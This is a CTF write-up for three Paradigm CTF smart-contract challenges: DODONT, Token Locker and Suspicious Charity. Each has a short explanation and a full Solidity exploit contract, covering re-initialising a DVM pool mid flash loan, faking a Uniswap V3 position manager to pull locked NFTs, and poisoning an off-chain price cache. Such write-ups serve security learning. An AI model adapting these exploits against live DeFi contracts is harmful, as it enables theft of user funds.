# Paradigm CTF Writeup
We have solved all challenges (didn't manage to get the exploit working for JOP in the last minute 😭). 


[DODNT](#dodont)  
[Token Locker](#token-locker)  
[Suspicious Charity](#suspicious-charity)

### DODONT
The DVM contract deployed at `0x1a650d6F031555837D016142b5Aec2E76ab5637F`'s init can be called by anyone. 

```solidity
import "forge-std/test.sol";
import "../src/Challenge.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "forge-std/console.sol";

interface CloneFactoryLike {
    function clone(address) external returns (address);
}

interface DVMLike {
    function init(
        address maintainer,
        address baseTokenAddress,
        address quoteTokenAddress,
        uint256 lpFeeRate,
        address mtFeeRateModel,
        uint256 i,
        uint256 k,
        bool isOpenTWAP
    ) external;

    function buyShares(address) external;
    function flashLoan(
        uint256 baseAmount,
        uint256 quoteAmount,
        address assetTo,
        bytes calldata data
    ) external;
    function _QUOTE_TOKEN_() external view returns (address);
}

contract QuoteToken is ERC20 {
    constructor() ERC20("Quote Token", "QT") {
        _mint(msg.sender, 1_000_000 ether);
    }

    function mint(address to, uint256 value) public {
        _mint(to, value);
    }
}


contract Exploit {
    CloneFactoryLike private immutable CLONE_FACTORY = CloneFactoryLike(0x5E5a7b76462E4BdF83Aa98795644281BdbA80B88);
    address private immutable DVM_TEMPLATE = 0x2BBD66fC4898242BDBD2583BBe1d76E8b8f71445;

    IERC20 private immutable WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    address public challenge;
    address public system;
    DVMLike public dvm;
    QuoteToken public quoteToken;

    function exploit() public {
        dvm = DVMLike(Challenge(0x1a650d6F031555837D016142b5Aec2E76ab5637F).dvm());
        quoteToken = QuoteToken(dvm._QUOTE_TOKEN_());
        dvm.flashLoan(WETH.balanceOf(address(dvm)), 
            quoteToken.balanceOf(address(dvm)),
            address(this), hex"11");
    }

    function DVMFlashLoanCall(address a, uint256 b, uint256 c, bytes memory d) public {
        QuoteToken t1 = new QuoteToken();
        QuoteToken t2 = new QuoteToken();
        t1.transfer(address(dvm), 1_000_000 ether);
        t2.transfer(address(dvm), 1_000_000 ether);


        dvm.init(address(this), 
            address(t1),
            address(t2),
            3000000000000000,
            address(0x5e84190a270333aCe5B9202a3F4ceBf11b81bB01),
            1,
            1000000000000000000,
            false
        );
    }
}
```




### Token Locker
ERC20 and ERC721 share same function signature. You can exploit this observation and make Uniswap V3 NFT to be treated as an ERC20 token in the protocol.


```solidity
import "forge-std/test.sol";
import "forge-std/console.sol";
import "../src/Challenge.sol";
import "../src/UNCX_ProofOfReservesV2_UniV3.sol";


contract Exploit {
    Challenge c = Challenge(0x0147383f0CA823cCc5F5609302b0fAEFFa48A5E8);
    IUNCX_ProofOfReservesV2_UniV3 v = IUNCX_ProofOfReservesV2_UniV3(0x7f5C649856F900d15C83741f45AE46f5C6858234);
    INonfungiblePositionManager u = INonfungiblePositionManager(0xC36442b4a4522E871399CD717aBDD847Ab11FE88);
    IWETH weth = IWETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IERC20 usdt = IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7);
    IUniswapV2Router02 r = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

    uint256 ctid;

    function exploit(uint256 m) public {
        for (uint256 i = 0; i < m; i++) {
            ctid = u.tokenOfOwnerByIndex(address(v), 0);
            console.log(ctid);



            bytes[] memory r = new bytes[](0);

            
            LockParams memory lock = LockParams({
                nftPositionManager: INonfungiblePositionManager(address(this)),
                nft_id: 24,
                dustRecipient: address(this),
                owner: address(this),
                additionalCollector: address(this),
                collectAddress: address(this),
                unlockDate: block.timestamp + 1,
                countryCode: 0,
                feeName: "DEFAULT",
                r: r
            });
            v.lock(lock);
            u.transferFrom(address(v), address(this), ctid);
        }

        console.log("balanceOf", u.balanceOf(address(v)));
    }

    function safeTransferFrom(address from, address to, uint256 tokenId) public {
        
    }

    function positions(uint256 tokenId)
        external
        view
        returns (
            uint96 nonce,
            address operator,
            address token0,
            address token1,
            uint24 fee,
            int24 tickLower,
            int24 tickUpper,
            uint128 liquidity,
            uint256 feeGrowthInside0LastX128,
            uint256 feeGrowthInside1LastX128,
            uint128 tokensOwed0,
            uint128 tokensOwed1
        )
    {
        nonce = 0;
        operator = address(this);
        token0 = address(0xC36442b4a4522E871399CD717aBDD847Ab11FE88);
        token1 = address(this);
        fee = 0;
        tickLower = 0;
        tickUpper = 0;
        liquidity = 0;
        feeGrowthInside0LastX128 = 0;
        feeGrowthInside1LastX128 = 0;
        tokensOwed0 = 0;
        tokensOwed1 = 0;
    }


    function factory() external view returns (address) {
        return address(this);
    }


    function getPool(
        address tokenA,
        address tokenB,
        uint24 fee
    ) external view returns (address) {
        return address(this);
    }

    function feeAmountTickSpacing(uint24 fee) external view returns (int24) {
        return 1;
    }

    function decreaseLiquidity(INonfungiblePositionManager.DecreaseLiquidityParams calldata params)
    external
    payable
    returns (uint256 amount0, uint256 amount1) {
        return (0, 0);
    }

    function collect(INonfungiblePositionManager.CollectParams calldata params) external payable returns (uint256 amount0, uint256 amount1) {
        return (ctid, 0);
    }


    function balanceOf(address owner) external view returns (uint256) {
        return 0;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        return true;
    } 


    function burn(uint256 tokenId) external payable {

    }


    function mint(INonfungiblePositionManager.MintParams calldata params)
        external
        payable
        returns (
            uint256 tokenId,
            uint128 liquidity,
            uint256 amount0,
            uint256 amount1
        ) {
            return (0, 0, ctid, 0);
        }

        function onERC721Received(address operator, address from, uint256 tokenId, bytes calldata data)
        public
        pure
        returns (bytes4)
    {
        return IERC721Receiver.onERC721Received.selector;
    }
}
```



### Suspicious Charity
The Python script cache pool's tokens address based on its name, which is formed using `string(uint8)`. We recognize that when `string(>79)`, they become the same in the Python script, which can lead to using incorrect cache. The exploit first create 78 useless pairs, then one pair with low liquidity but high price. After it got cached, we then create a pair with high liquidity but low price. Note that here, in the Python script, the price of the pair is mistreated as the previous expensive pair's.


```solidity
import "../src/Challenge.sol";
import "../src/Router.sol";
import "../src/Token.sol";
import "forge-std/console.sol";
import "forge-std/test.sol";


contract Exploit {
    Router r;

    constructor() {
        Challenge chall = Challenge(0x10d9E3Da7B5e7381A0506BED1068FE4E9d0158Bb);
        r = Router(chall.ROUTER());
    }

    function setUp() public {
        vm.createSelectFork("http://suspicious-charity.challenges.paradigm.xyz:8545/dcb357a1-0c83-4b1a-bb54-386f76241448/main", 18451421);
        Challenge chall = Challenge(0x10d9E3Da7B5e7381A0506BED1068FE4E9d0158Bb);
        r = Router(chall.ROUTER());
    } 


    function STEP0() public {
        require(r.totalListing() <= 78 * 2, "EXCEED_LISTING_CAP");
        address t1 = r.createToken("a", "a");
        address t2 = r.createToken("b", "b");
        r.listing(t1, 1);
        r.listing(t2, 1);
        r.mint(t1,  10 ** 3 + 1);
        r.mint(t2,  10 ** 3 + 1);
        address pair_addr = r.createPair(t1, t2);
        Pair pair = Pair(pair_addr);
        Token(t1).transfer(address(pair), 10 ** 3 + 1);
        Token(t2).transfer(address(pair),  10 ** 3 + 1);
        pair.mint(address(this));
    }

    function STEP1() public {
        address t1 = r.createToken("a", "a");
        address t2 = r.createToken("b", "b");
        r.listing(t1, 1e16);
        r.listing(t2, 1e16);
        r.mint(t1, 1e3 + 1);
        r.mint(t2, 1e3 + 1);
        address pair_addr = r.createPair(t1, t2);
        Pair pair = Pair(pair_addr);
        Token(t1).transfer(address(pair), 1e3 + 1);
        Token(t2).transfer(address(pair), 1e3 + 1);
        pair.mint(address(this));
    }



    function STEP2() public {
        address t1 = r.createToken("a", "a");
        address t2 = r.createToken("b", "b");
        r.listing(t1, 1);
        r.listing(t2, 1);
        r.mint(t1, 1e16);
        r.mint(t2, 1e16);
        address pair_addr = r.createPair(t1, t2);
        Pair pair = Pair(pair_addr);
        Token(t1).transfer(address(pair), 1e15);
        Token(t2).transfer(address(pair), 1e15);
        pair.mint(address(this));

        pair.transfer(address(r.flagCharity()), pair.balanceOf(address(this)));
    }

    
}
```
